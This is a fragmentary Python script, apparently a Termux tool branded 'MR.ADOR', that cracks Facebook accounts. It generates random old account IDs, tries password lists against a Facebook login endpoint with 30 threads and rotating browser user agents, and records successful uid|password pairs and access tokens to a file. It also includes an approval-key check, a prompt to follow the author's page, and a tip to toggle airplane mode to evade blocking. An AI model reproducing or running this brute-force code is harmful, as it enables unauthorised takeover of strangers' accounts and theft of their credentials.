...
def logo():
  ...
  ═══════════════════════════════════════════════════════💥
\t\033[1;97m[\x1b[1;97m\x1b[1;41m MR.ADOR MR.ADOR Qureshi\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :5\x1b[0m\x1b[1;97m] \033[1;37m 
 ═══════════════════════════════════════════════════════💥
 """)
def logo2():
	#MR.ADOR apna logo paste krna hw
	print ("""
...
════════════════════════════════════════════════════════💥
\t\033[1;97m[\x1b[1;97m\x1b[1;41m MR.ADOR. Ador/ MR.ADOR. Ador\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :6\x1b[0m\x1b[1;97m] \033[1;37m 
════════════════════════════════════════════════════════💥
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : MR.ADOR. Ador\x1b[0m\x1b[1;97m]
...
def helpnote():
	...
	#MR.ADOR nichy httsp sy hata kr apna github aproval link dalna
	subprocess.check_output(["am", "start", "https://github.com/MR.ADOR. Ador/MR.ADOR. Ador/blob/main/Approval.txt"])
	#MR.ADOR apni facebook id link dalna
	exit(" [=>] FACEBOOK :  Ft Alvi")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			#MR.ADOR pr v apna github link dalna aproval wala
			plr = requests.get('https://github.com/MR.ADOR. Ador/MR.ADOR. Ador/blob/main/Approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m [•] Facebook  : Ft Alvi\x1b[0m\x1b[1;97m] \033[1;37m 

\t\033[1;97m[\x1b[1;97m\x1b[1;41m [•] Github       : github.com/Mr-Ador\x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m [•] Stetus       : Premium\x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m [•] Network   : 3G, 4G/5G,  ON\x1b[0m\x1b[1;97m]
═══════════════════════════════════💥
    """)
		print("%s [%s•%s] %sTOOL TYPE : %sOLD IDZ 2009"%(G,R,G,B,G))
		print("%s [%s•%s] %sVERSION      : %s2.0.8"%(G,R,G,B,G))
		print("%s [%s•%s] %sYOUR KEY    : %s%s"%(G,R,G,B,G,key))
		print("───────────────────────────────────────────────────────× ")
		print(" \t\033[1;97m[\x1b[1;97m\x1b[1;41m FOLLOW MY PAGE FIRST\x1b[0m\x1b[1;97m] \033[1;37m ")
		subprocess.check_output(["am", "start", "https://www.facebook.com/𝙈𝙍-𝘼𝘿𝙊𝙍-107968471946247/"])
		print("───────────────────────────────────────────────────────× ")
		print("%s [%s1%s]%s CRACK RANDOM FB ID 2009-11 {JUST NOW} %s"%(G,R,G,Y,B))
		...
		if tanya in ["", " "]:
			...
			Main()
#MR.ADOR nichy kch cherna ni just name chnge krna
	def fbtua(self):
		x = 11111111
		xx = 99999999
		idx = "1000000" 
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\033[0;92m[=×>]\033[0;92m NOTE : ENJOY TOOLS")
				print("\033[0;92m[=×>]\033[0;92m NOTE : USE FLGHT (AIRPLANE) MODE OFF ON BEFORE USE")
				print("\033[0;97m───────────────────────────────────────────────────────× ")
				for user in self.id:
...
'Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36',
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;32m[Ok_MR.ADOR.😘] %s | %s\033[0;32m         "%(uid, pw))
				print ("\r \033[1;32m Congrats ")
				self.ok.append("%s|%s"%(uid, pw))
				open("Ok_MR.ADOR.😘.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[1;32m[Ok_MR.ADOR.😘] %s | %s\033[1;32m         "%(uid, pw))
 ...
 #MR.ADOR copy krke apna name dal dyna
...
if len(sys.argv) == 2:
	...
	print("\n [*] Author        : MR.ADOR
		...
		print(" [*] github 	    : github.com/Mr-Ador")
		print(" [*] Facebook   : Ft Alvi ")
